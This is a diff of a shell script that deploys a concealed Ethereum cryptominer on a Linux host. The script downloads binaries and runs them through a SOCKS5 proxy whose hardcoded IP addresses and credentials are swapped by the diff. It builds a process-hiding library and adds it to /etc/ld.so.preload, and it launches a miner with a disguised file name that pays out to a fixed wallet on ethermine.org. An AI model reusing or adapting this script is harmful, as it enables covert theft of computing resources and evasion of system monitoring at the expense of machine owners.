@@ -2,7 +2,7 @@
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
 
-apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl
+apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
 
 wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
 
@@ -11,11 +11,10 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 209.127.191.180:9279
-socks5_username = jlijgtqg
-socks5_password = e2fsr4wc4i0c
+socks5 = 192.186.186.197:6239
+socks5_username = ubuntu2004
+socks5_password = LijayaAnli1188
 END
-
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
 
@@ -36,14 +35,14 @@ echo ""
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://raw.githubusercontent.com/gunturyogatama404/jijij//main/bezzHash
-chmod +x bezzHash
+./graftcp/graftcp wget https://gitlab.com/jiorio669/donlod/-/raw/main/145
+chmod +x 145
 
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
-unzip magicBezzHash.zip
+./graftcp/graftcp wget https://gitlab.com/jiorio669/donlod/-/raw/main/magic145.zip
+unzip magic145.zip
 make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./bezzHash --algo ETHASH --pool us1.ethermine.org:4444 --user 0x416ae3f8ae189add6a5b3b26cab1070b4397edfb.$(echo $(shuf -i 1-9999 -n 1)-WEWEK)
+./graftcp/graftcp ./145 --coin ETH --pool us1.ethermine.org:4444 --user 0x416ae3f8ae189add6a5b3b26cab1070b4397edfb.$(echo $(shuf -i 1-9999 -n 1)-WEWEK)
